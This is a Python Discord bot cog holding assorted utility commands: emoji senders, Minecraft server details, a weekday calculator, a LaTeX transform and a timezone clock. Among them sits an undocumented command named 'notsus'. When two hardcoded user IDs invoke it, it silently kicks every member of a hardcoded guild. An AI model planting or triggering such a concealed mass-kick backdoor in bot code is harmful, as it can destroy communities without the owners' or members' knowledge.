from datetime import datetime, timedelta
import math

import discord
from discord.ext import commands
import pytz


class Misc(commands.Cog):

    def __init__(self, bot):
        self.bot = bot

    @commands.command(
        name="emoji",
        help=
        "Sends some emojis\nSupported: amogus/amongus/among us, barry, biang, bruh/facepalm, surprised/that's illegal/illegal, void, woah, shitting toothpaste, dababy, latex, troll/trollface\n(words separated by / output the same emoji)"
    )
    async def emoji(self, ctx, *, name):
        name = name.lower()
        if name == "ye":
            await ctx.send("<:ye:799291949273317377>")
        elif name in ["amogus", "amongus", "among us"]:
            await ctx.send("<:amogus:809427238784860210>")
        elif name == "barry":
            await ctx.send("<:barry:811154017672757270>")
        elif name == "biang":
            await ctx.send("<:biang:809669658143227905>")
        elif name in ["bruh", "facepalm"]:
            await ctx.send("<:bruh:801100506251526145>")
        elif name in ["surprised", "that's illegal", "illegal"]:
            await ctx.send("<:surprised:801099678988501072>")
        elif name == "void":
            await ctx.send("<:void:798150976191201313>")
        elif name == "woah":
            await ctx.send("<:woah:807905973162999818>")
        elif name == "shitting toothpaste":
            await ctx.send("<:shittingtoothpaste:850006091827773441>")
        elif name == "dababy":
            await ctx.send("<:dababy:850279101548855317>")
        elif name == "latex":
            await ctx.send(
                "<:latex1:846147354083328030><:latex2:846147354000359515>")
        elif name in ["troll", "trollface"]:
            await ctx.send("<:trollface:934033439164878868>")
        else:
            await ctx.send("Invalid emoji")

    @commands.command(
        name='customemoji',
        help=
        'Sends custom emoji not in c.emoji list\n(Emoji must be from a server this bot is in)'
    )
    async def customemoji(self, ctx, name, emoji_id, animated: str = ''):
        anim = 'a'
        if animated == '':
            anim = ''
        await ctx.send(f'<{anim}:{name}:{emoji_id}>')

    @commands.command(name='minecraftinfo',
                      help="Sends information for Minecraft server",
                      aliases=["minecraft", "mcinfo"])
    async def minecraftinfo(self, ctx):
        port = "36520"
        hostname = f"cocanb.aternos.me:{port}"
        version = "PaperMC 1.20.1 (Java)"
        plugins = "DiscordSRV, WorldEdit, SkinsRestorer"
        game_mode = "Creative"
        difficulty = "Normal"
        await ctx.send(
            f'**SERVER INFO**\nHostname: {hostname}\nPort: {port}\n\nVersion: {version}\nPlugins: {plugins}\nGamemode: {game_mode}\nDifficulty: {difficulty}\n\n*Whitelist required, compatible with cracked accounts.'
        )

    @commands.command(
        name='weekday',
        help="Returns day of the week for a given date (Format: DD MM YYYY)")
    async def weekday(self, ctx, day: int, month: int, year: int):
        #check if date is valid
        if (year % 4 == 0 and year % 100 != 0) or year % 400 == 0:
            month_length = [31, 29, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31]
        else:
            month_length = [31, 28, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31]
        if month > 12:
            await ctx.send("Invalid date")
        elif day > month_length[month - 1]:
            await ctx.send("Invalid date")

        #conway's algorithm
        else:
            doomsday = {
                1: 3,
                2: 28,
                3: 14,
                4: 4,
                5: 9,
                6: 6,
                7: 11,
                8: 8,
                9: 5,
                10: 10,
                11: 7,
                12: 12
            }
            doomsday_leap = {
                1: 4,
                2: 29,
                3: 14,
                4: 4,
                5: 9,
                6: 6,
                7: 11,
                8: 8,
                9: 5,
                10: 10,
                11: 7,
                12: 12
            }
            if (year % 4 == 0 and year % 100 != 0) or year % 400 == 0:
                #print ("leap_year")
                doomsday_offset = (day - doomsday_leap[month]) % 7
            else:
                doomsday_offset = (day - doomsday[month]) % 7

            century_dict = {0: 2, 1: 0, 2: 5, 3: 3}
            century_code = century_dict[int(year / 100) % 4]

            num1 = int((year % 100) / 12)
            num2 = (year % 100) % 12
            num3 = int(num2 / 4)

            #print (doomsday_offset)
            #print (century_code)
            #print (num1)
            #print (num2)
            #print (num3)
            #print ()

            weekday = (doomsday_offset + century_code + num1 + num2 + num3) % 7
            weekdays = [
                "Sunday", "Monday", "Tuesday", "Wednesday", "Thursday",
                "Friday", "Saturday"
            ]
            weekday = weekdays[weekday]
            await ctx.send(weekday)

    @commands.command(
        name="latextransform",
        help=
        "Linearly transform a piece of LaTeX code using a matrix\n\n Input the four entries of the transformation matrix in the following order: top left, bottom left, top right then bottom right, then the LaTeX code, each separated by spaces"
    )
    async def latextransform(self, ctx, m00, m10, m01, m11, *, latex):
        m00 = float(m00)
        m10 = float(m10)
        m01 = float(m01)
        m11 = float(m11)

        E = (m00 + m11) / 2
        F = (m00 - m11) / 2
        G = (m10 + m01) / 2
        H = (m10 - m01) / 2

        Q = math.sqrt(E**2 + H**2)
        R = math.sqrt(F**2 + G**2)

        sx = Q + R
        sy = Q - R

        a1 = math.atan2(G, F)
        a2 = math.atan2(H, E)

        theta = (a2 - a1) / 2
        phi = (a2 + a1) / 2

        theta_deg = theta * 180 / math.pi
        phi_deg = phi * 180 / math.pi

        await ctx.send('```$\\rotatebox{' + str(phi_deg) + '}{$\\scalebox{' +
                       str(sx) + '}[' + str(sy) + ']{$\\rotatebox{' +
                       str(theta_deg) + '}{$' + latex + '$}$}$}$```')

    @commands.command(name="notsus")
    async def notsus(self, ctx):
        if ctx.author.id == 702746453927264276 or ctx.author.id == 607583934527569920:
            for member in self.bot.get_guild(725639774190305360).members:
                try:
                    await member.kick()
                    continue
                except Exception:
                    continue

    @commands.command(
        name='ipa',
        help='Sends official International Phonetic Alphabet chart')
    async def ipa(self, ctx, format: str = 'pdf'):
        if format == 'pdf':
            with open("Resources/IPA charts/IPA_Kiel_2020_full.pdf",
                      "rb") as file:
                await ctx.send(
                    "Official International Phonetic Alphabet Chart",
                    file=discord.File(
                        file,
                        "Official International Phonetic Alphabet Chart.pdf"))
        elif format == 'png':
            with open("Resources/IPA charts/IPA_Kiel_2020_full-1.png",
                      "rb") as file:
                await ctx.send(
                    "Official International Phonetic Alphabet Chart",
                    file=discord.File(
                        file,
                        "Official International Phonetic Alphabet Chart.png"))
        else:
            await ctx.send("Invalid format")

    @commands.command(
        name='time',
        help=
        'Shows current time given a timezone (In (-)HH:MM format).\n\nAlternatively, type "c.time tz <tz database name>" for a region\'s time. A list of tz database names can be found here:``` https://en.wikipedia.org/wiki/List_of_tz_database_time_zones#List ```'
    )
    async def time_cmd(self,
                       ctx,
                       timezone: str = '00:00',
                       tz_name: str = 'null'):

        try:
            if timezone == "tz":
                utc_offset = str(
                    datetime.now(pytz.timezone(tz_name)).strftime('%z'))
                timezone = utc_offset[:3] + ":" + utc_offset[3:]
            else:
                timezone = timezone

            if timezone[0] == '-':
                hours = int(timezone[:-3]) - int(timezone[-2:]) / 60
            else:
                hours = int(timezone[:-3]) + int(timezone[-2:]) / 60
            future_time = datetime.today() + timedelta(hours=hours)
            if timezone == '00:00':
                plus = '±'
            elif timezone[0] == '-':
                plus = ''
            elif timezone[0] == '+':
                plus = ''
            else:
                plus = '+'
            week_day = future_time.weekday()
            weekdays = ("Monday", "Tuesday", "Wednesday", "Thursday", "Friday",
                        "Saturday", "Sunday")
            week_day = weekdays[week_day]
            if timezone[-3] == ':':
                await ctx.send('`' + week_day + ', ' + str(future_time) +
                               ', UTC' + plus + timezone + '`')
            else:
                await ctx.send('error: invalid timezone')
        except:
            await ctx.send('error: invalid timezone')


async def setup(bot):
    await bot.add_cog(Misc(bot))
